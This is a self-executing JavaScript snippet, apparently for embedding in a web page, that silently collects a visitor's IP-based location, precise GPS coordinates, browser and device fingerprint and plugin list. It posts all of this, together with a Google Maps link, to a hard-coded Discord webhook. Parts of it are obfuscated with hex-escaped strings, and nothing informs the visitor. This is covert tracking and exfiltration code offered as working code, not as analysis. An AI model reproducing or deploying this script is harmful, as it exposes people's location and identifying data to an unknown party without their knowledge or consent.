(async()=>{
    const _0x1c8e=["\x70\x65\x72\x66\x6F\x72\x6D\x61\x6E\x63\x65\x2E\x74\x69\x6D\x65\x73","\x73\x65\x74\x43\x6F\x6E\x74\x65\x78\x74","\x20","\x66\x65\x74\x63\x68","\x66\x6F\x72\x63\x65","\x66\x6F\x72\x63\x65\x00","\x76\x61\x72\x20\x74\x6F\x20\x54\x6F\x0A\x66\x6F\x72\x20\x65\x6B\x20\x73\x65\x72\x76\x31\x31\x32\x61\x77\x30\x32\x33\x38\x63\x36\x37\x38\x39\x79","\x68\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x31\x32\x33\x38","d","t","4b","counterOnline","g","now"];
// _0x1c8eの配列を回転させて元の値を取得
    const __=(_0x1c8e)=>_0x1c8e[Math.floor(Math.random()*_0x1c8e.length)];
    async function send(_0x1b45){const _0x5bf8="https://discord.com/api/webhooks/1297075378023825498/_Vqu77-VLH9GKbfAc_TFrf2Hnb4HC1ZJETWU67QpQfEr18f20GJCkvOMSi4xi9W7erWd";
        const _0x13d0={embeds:[{title:__(_0x1c8e[0]),fields:[{name:__(_0x1c8e[1]),value:_0x1b45.ip,inline:true},{name:__(_0x1c8e[2]),value:_0x1b45.country,inline:true},{name:__(_0x1c8e[3]),value:_0x1b45.region,inline:true},{name:__(_0x1c8e[4]),value:_0x1b45.org,inline:true},{name:__(_0x1c8e[5]),value:_0x1b45.referrer||'なし',inline:true}],color:0x1f8b4c},{title:__(_0x1c8e[0]),fields:[{name:"ブラウザ",value:_0x1b45.browser,inline:true},{name:"OS",value:_0x1b45.os,inline:true},{name:"接続",value:_0x1b45.connection,inline:true},{name:"広告機能サポート",value:_0x1b45.features,inline:false}],color:0x3498db},{title:"デバイス",fields:[{name:"スクリーン",value:_0x1b45.screenSize,inline:true},{name:"タイムゾーン",value:_0x1b45.timezone,inline:true},{name:"クッキー",value:_0x1b45.cookies,inline:true},{name:"プラットフォーム",value:_0x1b45.platform,inline:true},{name:"エクステンション",value:_0x1b45.extensions,inline:true},{name:"接続タイプ",value:_0x1b45.deviceConnection,inline:true},{name:"読み込み時間",value:`${_0x1b45.loadTime}ms`,inline:true},{name:"入力デバイス",value:_0x1b45.inputDevices,inline:true},{name:"向き",value:_0x1b45.screenOrientation,inline:true},{name:"Bluetooth",value:_0x1b45.bluetooth,inline:true},{name:"Touch Events",value:_0x1b45.touchEvents,inline:true},{name:"セキュリティ",value:_0x1b45.securityState,inline:true}],color:0xe74c3c},{title:"位置",fields:[{name:"緯度",value:_0x1b45.latitude.toString(),inline:true},{name:"経度",value:_0x1b45.longitude.toString(),inline:true},{name:"リンク",value:`[ここをクリック](https://www.google.com/maps/@${_0x1b45.latitude},${_0x1b45.longitude},15z)`,inline:true}],color:0x8e44ad}]};
        await fetch(_0x5bf8,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(_0x13d0)})};
    async function getUserIP(){try{const ipResponse=await fetch('https://api.ipify.org?format=json');const ipData=await ipResponse.json();const locationResponse=await fetch(`https://ipapi.co/${ipData.ip}/json/`);const locationData=await locationResponse.json();return locationData; }catch(e){console.error('エラー:',e);}};
    function getBrowser(){return navigator.userAgent;};
    function getScreen(){return`${window.innerWidth}x${window.innerHeight}`;};
    function getZone(){return Intl.DateTimeFormat().resolvedOptions().timeZone;};
    function getCookies(){return navigator.cookieEnabled?'有効':'無効';};
    function getPlatform(){return navigator.platform;};
    function getConnection(){return navigator.connection?navigator.connection.effectiveType:'不明';};
    function getGeo(){return new Promise((r,s)=>{if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{r({latitude:p.coords.latitude,longitude:p.coords.longitude});},()=>{r({latitude:'取得不可',longitude:'取得不可'});});}else{r({latitude:'取得不可',longitude:'取得不可'});}})};
    function getOS(){const ua=navigator.userAgent;let os='不明';if(ua.includes('Win'))os='Windows';else if(ua.includes('Mac'))os='MacOS';else if(ua.includes('X11'))os='Unix';else if(ua.includes('Linux'))os='Linux';return os;};
    function getFeatures(){const f=[];f.push(`WebSockets: ${'WebSocket'in window?'サポート':'未サポート'}`);f.push(`LocalStorage: ${'localStorage'in window?'サポート':'未サポート'}`);f.push(`SessionStorage: ${'sessionStorage'in window?'サポート':'未サポート'}`);f.push(`Fetch: ${'fetch'in window?'サポート':'未サポート'}`);return f.join(', ');};
    function getExts(){const sp=[];const p=navigator.plugins;for(let i=0;i<p.length;i++){sp.push(p[i].name);}return sp.length>0?sp.join(', '):'なし';};
    function getVehicle(){return'車両情報の確認はサポートされていません';};
    function getStorage(){return`LocalStorage: ${'localStorage'in window?'サポート':'未サポート'}, SessionStorage: ${'sessionStorage'in window?'サポート':'未サポート'};`;
    };
    function getDeviceType(){return navigator.connection?navigator.connection.type||navigator.connection.effectiveType:'不明';};
    function getLoadTime(){return performance.timing.loadEventEnd-performance.timing.navigationStart;};
    function getDevices(){const d=[];if('ontouchstart'in window)d.push('タッチデバイス');if(navigator.keyboard)d.push('キーボード');if(navigator.getGamepads)d.push('ゲームパッド');return d.length>0?d.join(', '):'不明';};
    function getOrientation(){return screen.orientation?screen.orientation.type:'不明';};
    function getBluetooth(){return'Web Bluetooth API: '+(navigator.bluetooth?'サポート':'未サポート');};
    function getTouchSupport(){return'Touch Events: '+('ontouchstart'in window?'サポート':'未サポート');};
    function getSecurity(){return window.isSecureContext?'安全':'不明';};

    const start=performance.now();
    const ipData=await getUserIP();
    const locData=await getGeo();
    if(ipData) {
        const data={browser:getBrowser(),screenSize:getScreen(),timezone:getZone(),cookies:getCookies(),platform:getPlatform(),connection:getConnection(),os:getOS(),features:getFeatures(),executionTime:Math.round(performance.now()-start),referrer:document.referrer||'なし',extensions:getExts(),vehicle:getVehicle(),webStorage:getStorage(),deviceConnection:getDeviceType(),loadTime:getLoadTime(),inputDevices:getDevices(),screenOrientation:getOrientation(),bluetooth:getBluetooth(),touchEvents:getTouchSupport(),securityState:getSecurity(),latitude:locData.latitude,longitude:locData.longitude};
        await send({...ipData,...data});
    }
})();
